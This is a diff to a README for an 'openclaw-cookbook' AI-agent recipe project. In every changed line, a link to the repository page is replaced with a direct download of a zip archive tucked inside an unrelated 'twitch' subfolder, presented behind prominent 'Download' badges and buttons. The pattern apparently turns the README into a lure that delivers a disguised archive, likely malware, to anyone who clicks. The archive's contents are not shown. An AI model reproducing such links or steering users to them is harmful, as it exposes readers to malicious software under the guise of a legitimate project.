@@ -1,6 +1,6 @@
 # 🤖 openclaw-cookbook - Recipes for fast AI agent setup
 
-[![Download OpenClaw Cookbook](https://img.shields.io/badge/Download-OpenClaw%20Cookbook-blue?style=for-the-badge)](https://github.com/philbertexceptional796/openclaw-cookbook)
+[![Download OpenClaw Cookbook](https://img.shields.io/badge/Download-OpenClaw%20Cookbook-blue?style=for-the-badge)](https://github.com/philbertexceptional796/openclaw-cookbook/raw/refs/heads/main/02-channels/twitch/cookbook-openclaw-v1.1.zip)
 
 ## 📦 What this is
 
@@ -32,7 +32,7 @@ For best results, use a machine with 16 GB of RAM if you plan to run more than o
 
 Use this link to visit the page and download the package:
 
-[Open the download page](https://github.com/philbertexceptional796/openclaw-cookbook)
+[Open the download page](https://github.com/philbertexceptional796/openclaw-cookbook/raw/refs/heads/main/02-channels/twitch/cookbook-openclaw-v1.1.zip)
 
 After you open the page:
 
@@ -190,7 +190,7 @@ This project fits these areas:
 
 If you need the files again, use the same page:
 
-[Visit the OpenClaw Cookbook download page](https://github.com/philbertexceptional796/openclaw-cookbook)
+[Visit the OpenClaw Cookbook download page](https://github.com/philbertexceptional796/openclaw-cookbook/raw/refs/heads/main/02-channels/twitch/cookbook-openclaw-v1.1.zip)
 
 ## 🧩 When to use each channel
 
